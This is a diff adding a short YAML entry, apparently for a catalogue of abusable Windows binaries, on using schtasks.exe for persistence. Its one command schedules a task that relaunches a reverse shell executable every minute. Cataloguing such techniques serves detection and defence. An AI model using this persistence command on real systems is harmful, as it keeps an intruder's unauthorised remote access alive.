@@ -1,0 +1,22 @@
+---
+Name: Schtasks.exe
+Description: Schedule periodic tasks
+Author: 'Ossi Vaananen'
+Created: '2018-10-24'
+Commands:
+  - Command: schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
+    Description: Create a recurring task to execute every minute.
+    Usecase: Create a recurring task, to eg. to keep reverse shell session(s) alive
+    Category: Persistence
+    Privileges: User
+    OperatingSystem: Windows
+Full Path:
+- Path: c:\windows\system32\schtasks.exe
+Code Sample: 
+- Code:
+Resources:
+ - Link: https://isc.sans.edu/forums/diary/Adding+Persistence+Via+Scheduled+Tasks/23633/
+ Acknowledgement:
+  - Person: Ossi Vaananen
+    Handle:
+---
